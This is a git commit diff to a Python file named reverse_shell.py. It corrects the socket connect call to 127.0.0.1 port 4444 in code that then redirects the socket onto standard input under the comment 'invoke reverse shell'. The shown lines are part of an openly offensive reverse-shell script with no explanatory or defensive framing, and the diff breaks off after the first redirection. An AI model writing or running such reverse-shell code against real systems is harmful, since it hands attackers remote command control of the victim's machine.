ed8569992675a896a5f3bd720425448f0e8a73aa
nashiaholloway <nashiaholloway1@gmail.com>
2020-02-25 20:35:37 -0500

    py reverse

--- reverse_shell.py
+++ reverse_shell.py
@@ -6,7 +6,7 @@ import os
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # connect to listening server
-s.connect("127.0.0.1", 4444)
+s.connect(("127.0.0.1", 4444))
 
 # invoke reverse shell
 os.dup2(s.fileno(), 0)
